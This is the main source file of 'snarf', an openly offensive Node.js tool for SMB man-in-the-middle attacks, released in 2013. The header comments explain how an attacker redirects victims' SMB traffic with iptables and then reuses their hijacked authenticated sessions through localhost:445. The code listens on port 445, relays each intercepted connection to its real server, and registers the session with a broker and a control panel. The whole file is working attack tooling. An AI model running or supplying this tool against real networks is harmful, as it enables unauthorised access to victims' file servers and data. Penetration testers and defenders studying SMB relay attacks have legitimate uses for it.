//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// 
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------
//
// snarf is an SMB man-in-the-middle (MITM) tool for taking control of
// intercepted SMB sessions.  This can be useful, particularly in the
// event that credentials defy cracking, even with rainbow tables.
//
// The attacker must set up his attack so that inbound SMB sessions are
// redirected to the "bind-IP" for snarf, which will then relay the
// connection through its completion.  Once complete, however, snarf 
// will maintain the connection and provide access for other tools to
// connect through it at localhost:445.  
//
// The session can be reused by any number of other tools, largely 
// without impairment of the original session's access to the server
// system.  
//
// Sample usage:
//
//   $ node snarf.js 192.168.1.4
//
// This will bind the MitM process at 192.168.1.4, and any connection
// coming in on that IP on port 445 will be relayed to to their
// destinations.  It is intended that you use iptables to redirect
// traffic appropriately.
//
// Contact: yakovdk@gmail.com
// Date:    2013-11-30
//

var util = require('util');
var net  = require('net');
var smb  = require("./smb.js");
var out  = require ("./out.js");
var midl = require("./middler.js");
var ctrl = require("./control.js");
var rout = require("./router.js");
var SMBBroker = require("./smbbroker.js").SMBBroker;
var Getopt = require("node-getopt");

out.red("SNARF - 0.2 - SMB Man in the Middle Attack Engine");
out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (TBD)");

getopt = new Getopt([
    ['d', 'defaultip=IP'                , 'Default IP (think LLMNR or NBNS)'],
    ['h', 'help',                          , 'Show help and usage statement']
]);

getopt.setHelp(
  "\nUsage: node snarf.js [OPTION] BindIP\n" +
  "\n" +
  "[[OPTIONS]]\n"
);

opt = getopt.parse(process.argv.slice(2));

if(opt.argv.length != 1 || opt.options['help']) {
    getopt.showHelp();
    process.exit(1);
}

var bindip = opt.argv[0];
var router = new rout.Router(bindip);
var broker = new SMBBroker();
var client;
var count = 0;
var globals = new Object;

globals.defip = opt.options["defaultip"] ? opt.options["defaultip"] : "0.0.0.0";

out.red("Default IP is " + globals.defip);

ctrl.ControlPanel(broker, 4001, globals);

client = net.createServer(function(sock) {
    sock.pause();
    out.red("Client " + sock.remoteAddress + ":" + sock.remotePort + " connected");
    
    router.checkout(sock.remoteAddress, sock.remotePort, function(tip) {
        if(tip == bindip || tip == "0.0.0.0") {
	    if(globals.defip && globals.defip != "0.0.0.0") {
	        if(globals.defip != sock.remoteAddress) {
	    	    out.red("Got inbound connection, routing to default");
	    	    tip = globals.defip;
	        } else {
                    
	    	    // Consider the MS09-001 check
                    
	    	    out.red("Received connection from " + globals.defip + " to " + globals.defip);
	    	    out.red("Not middling (it wouldn't work anyway)");
	    	    midl.NullMiddler(sock);
	    	    return;
	        }
	    } else {
                out.red("ERROR, can't relay connection destined for bindip");
                out.red("You may want to specify a default destination with");
                out.red("the '-d <ip>' flag.");
                midl.NullMiddler(sock);
                return;
            }
        }
	var server = net.connect({port: 445, host: tip}, function() {
            out.red("Server connected, will relay to " + tip);
	    var middler = new midl.Middler(count);
	    count += 1;
	    middler.setClientInfo(sock.remoteAddress,sock.remotePort,tip);
	    middler.setBroker(broker);
	    broker.addMiddler(middler);
	    middler.setServer(server);
	    middler.setOriginalClient(sock);
	    sock.resume();
	});
    });
});

client.listen(445, bindip, function() {
    out.red("Interception server bound to " + bindip + ":445");
});
